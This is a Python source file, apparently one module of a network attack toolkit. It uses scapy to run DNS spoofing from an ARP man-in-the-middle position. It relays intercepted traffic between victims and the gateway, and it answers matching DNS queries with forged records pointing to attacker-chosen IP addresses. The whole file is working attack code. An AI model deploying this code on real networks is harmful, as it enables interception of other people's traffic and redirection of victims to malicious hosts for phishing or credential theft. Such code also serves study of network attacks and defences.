from attacks.arp_spoof import ARPAttackSettings
from dataclasses import dataclass
from scapy.all import *
from util import Interface

@dataclass
class DNSEntry:
    url: str
    type: str
    ip: str

@dataclass
class DNSAttackSettings:
    arp_settings: ARPAttackSettings
    dns_rules: list[DNSEntry]

def forward_packet(settings: ARPAttackSettings, packet: Packet):
    interface = settings.interface
    victims = settings.sources
    gateway = settings.destinations[0]

    # We can only forward packets if we know where it should go
    if (not (Ether in packet and IP in packet)
       # Skip packets that are not addressed to our interface
       or (packet[Ether].dst != interface.mac_addr.lower())
       # Don't forward packets that we sent
       or (packet[IP].src == interface.ip_addr)
       # Don't forward packets that are sent to us
       or (packet[IP].dst == interface.ip_addr)):
        return

    # print(f'Forwarding {packet.summary()}')

    # victim -> gateway
    for victim in victims:
        if packet[IP].src == victim.ip_addr:
            packet[Ether].src = interface.mac_addr
            packet[Ether].dst = gateway.mac_addr
            # print(f'As {packet.summary()}')
            sendp(packet, verbose=0)
            return

    # gateway -> victim
    for victim in victims:
        if packet[IP].dst == victim.ip_addr:
            packet[Ether].src = interface.mac_addr
            packet[Ether].dst = victim.mac_addr
            # print(f'As {packet.summary()}')
            sendp(packet, verbose=0)
            return

def handle_packet_dns(settings: DNSAttackSettings, packet: Packet):
    """
    Inspects a packet.

    All packets are forwarded unless we should
    spoof the DNS request in the packet.
    """

    # We only handle packets that have UDP, IP and DNS protocols
    # Packet must contain DNS query and IP layer
    if not (DNS in packet and IP in packet and UDP in packet):
        return forward_packet(settings.arp_settings, packet)

    # check for dns standard query
    if DNSQR not in packet:
        return forward_packet(settings.arp_settings, packet)

    interface = settings.arp_settings.interface

    if Ether in packet and packet[Ether].src == interface.mac_addr:
        return

    query = packet[DNSQR]
    url = query.qname.decode()
    type = query.get_field('qtype').i2repr(query, query.qtype)

    # try to match request with one of our rules
    for rule in settings.dns_rules:
        if is_match(url, type, rule):
            packet[DNS].an = DNSRR(rrname=url, rdata=rule.ip)
            packet[DNS].ancount = 1

            response = Ether() / IP() / UDP() / packet[DNS]
            response[Ether].src = interface.mac_addr
            response[Ether].dst = packet[Ether].src
            response[IP].src = packet[IP].dst
            response[IP].dst = packet[IP].src
            response[UDP].sport = packet[UDP].dport
            response[UDP].dport = packet[UDP].sport

            sendp(response, iface=interface.name, verbose=0)
            return

    # forward the packet if no rule matches
    forward_packet(settings.arp_settings, packet)

def is_match(qname: str, type: str, dns_rule: DNSEntry):
    if dns_rule.type == '*':
        return qname.strip('.') == dns_rule.url.strip('.')
    else:
        return qname.strip('.') == dns_rule.url.strip('.') and type.upper() == dns_rule.type.upper()